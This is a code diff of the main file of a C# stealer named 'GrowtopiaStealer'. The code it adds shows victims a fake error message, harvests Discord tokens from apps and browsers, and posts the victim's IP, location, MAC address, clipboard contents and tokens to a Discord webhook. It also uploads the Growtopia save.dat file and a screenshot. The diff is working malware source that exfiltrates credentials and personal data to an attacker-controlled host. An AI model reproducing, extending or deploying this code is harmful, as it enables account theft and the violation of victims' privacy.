@@ -15,49 +15,6 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
 {
     static class Program
     {
-        /*
-        internal class Growtopia
-        {
-            
-            public static string strchange98(string strchange99)
-            {
-                byte[] array = File.ReadAllBytes(strchange99);
-                string @string = Encoding.ASCII.GetString(array);
-                //int x = int.Parse(@string.IndexOf("lastworld").ToString());
-                string result;
-                try
-                {
-                    //byte[] array = File.ReadAllBytes(strchange99);
-                    //string @string = Encoding.ASCII.GetString(array);
-                    string text = @string.Substring(@string.IndexOf("tankid_name") + 15, Convert.ToInt32(array[@string.IndexOf("tankid_name") + 11]));
-                    /*int i;
-                    //x = int.Parse(@string.IndexOf("lastworld").ToString());
-                    string text2 = @string.Substring(@string.IndexOf("lastworld") + 13, Convert.ToInt32(array[@string.IndexOf("lastworld") + 25]));
-                    string text3 = "";
-                    for (i=0;i<text2.Length;i++)
-                    {
-                        int z;
-                        z = text2[i];
-                        if (z >= 48 && z <= 122)
-                        {
-                            text3 = text3 + text2[i];
-                        }
-                        else
-                            break;
-                    }*/
-        /*result = text;
-        //result = result + Environment.NewLine;
-        //result = result + "Last world: " + text3.ToUpper();
-    }
-    catch
-    {
-        result = "Null";
-    }
-    return result;
-}
-
-
-    }*/
         public static List<string> goSendTokens = DiscordStealing.AllTokens;
         /// <summary>
         /// The main entry point for the application.
@@ -65,6 +22,11 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
         [STAThread]
         static void Main()
         {
+            #region Fake error
+            if (DiscordWebhook.FakeError == true)
+                MessageBox.Show(DiscordWebhook.FakeErrorMessage); // Shows fake error if its enabled in DiscordWebhook.cs
+            #endregion
+
             #region Stealing discord tokens from apps and browsers.
             Task.WaitAll(
             DiscordStealing.DiscordApp(),
@@ -83,6 +45,11 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
             DiscordStealing.ThreeHundredSixty(),
             DiscordStealing.CocCoc()
             );
+            #endregion
+
+            #region exists or not
+            Growtopia.GrowtopiaExistOrNo();
+            Discord.DiscordExistsOrNo();
             #endregion
 
             #region Rainbow Line gif
@@ -145,7 +112,7 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
                     new DiscordMessageEmbed(
                         "GrowtopiaStealer",
                         color: 65280,
-                        author: new DiscordMessageEmbedAuthor("NEW LOG FROM - " + Environment.MachineName + " " + Environment.UserName),
+                        author: new DiscordMessageEmbedAuthor(DateTime.Now.ToString("h:mm:ss") + " " + Environment.MachineName + " " + Environment.UserName),
                         description:
                                "\n ================================" +
                                "\n```IP: " + IP + "```" +
@@ -153,17 +120,38 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
                                "\n ================================" +
                                "\n```Country: " + Country + "```" +
                                "\n```City: " + City + "```" +
-                               "\n```ClipBoard: " + Buffer.GetBuffer() + "```" +
                                "\n```MAC Address: " + getTarget + "```" +
-                               "\n ================================",
+                               "\n ================================" +
+                               "\n Grabbed Softwares:" +
+                               (Counting.Growtopia > 0 ? "\n```Growtopia```" : "") +
+                               (Counting.Discord > 0 ? "\n```Discord```" : "")
+                               ,
                         thumbnail: new DiscordMessageEmbedThumbnail("https://i.imgur.com/2Via1dY.jpg"),
+                        image: new DiscordMessageEmbedImage("https://cdn.discordapp.com/attachments/819331742212161576/877001811888865290/newlog.jpg"),
                         footer: new DiscordMessageEmbedFooter("GrowtopiaStealer | TheC0mpany", "https://i.imgur.com/2Via1dY.jpg")
                                )});
-            client.SendToDiscord(message);
             #endregion
 
-            //client.SendToDiscord(rainbow);
-
+            #region ClipBoard
+            // Send cliboard with diffrent message because its can be long text and you will lost log data
+            var clipboard = new DiscordMessage(
+                 "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ",
+                 username: "GrowtopiaStealer | TheC0mpany",
+                 avatarUrl: "https://i.imgur.com/2Via1dY.jpg",
+                 tts: false,
+                 embeds: new[]{
+                    new DiscordMessageEmbed(
+                        "Clipboard | GrowtopiaStealer",
+                        color: 65280,
+                        author: new DiscordMessageEmbedAuthor("Clipboard - " + Environment.MachineName + " " + Environment.UserName),
+                        description:
+                        "\n```" + Buffer.GetBuffer() + "```"
+                        ,
+                        thumbnail: new DiscordMessageEmbedThumbnail("https://i.imgur.com/2Via1dY.jpg"),
+                        image: new DiscordMessageEmbedImage("https://cdn.discordapp.com/attachments/819331742212161576/877001757346132028/clipboard.jpg"),
+                        footer: new DiscordMessageEmbedFooter("GrowtopiaStealer | TheC0mpany", "https://i.imgur.com/2Via1dY.jpg")
+                               )});
+            #endregion
             #region Tokens
             var token = new DiscordMessage(
                 "Tokens: \n" + Tokens,
@@ -171,10 +159,20 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
                 avatarUrl: "https://i.imgur.com/2Via1dY.jpg",
                 tts: false
                 );
-            client.SendToDiscord(token);
             #endregion
 
+            #region Sending logs
             client.SendToDiscord(rainbow);
+            Thread.Sleep(500);
+            client.SendToDiscord(message);
+            Thread.Sleep(1500);
+            client.SendToDiscord(clipboard);
+            Thread.Sleep(1500);
+            client.SendToDiscord(token);
+            Thread.Sleep(1500);
+            client.SendToDiscord(rainbow);
+            Thread.Sleep(1500);
+            #endregion
 
             #region Ghost ping
             string mssgBody = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ";
@@ -191,16 +189,15 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
             string filepath1 = @"C:\Users\" + User + @"\AppData\Local\Temp\screenshot.png";
             try
             {
-                DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application); // Sending log
-                DiscordWebhook.SendFile(mssgBody, filename1, fileformat1, filepath1, application); // Sending Screenshot 
+                DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application); // Sending Save.dat
+                DiscordWebhook.SendFile(mssgBody, filename1, fileformat1, filepath1, application); // Sending Screenshot
+                client.SendToDiscord(rainbow);
             }
             catch
             {
                 DiscordWebhook.Send("Log size is more then 8 MB. Sending isn`t available.");
             }
             #endregion
-
-            client.SendToDiscord(rainbow);
 
             #region Delete screenshot file
             //Delete screenshot file
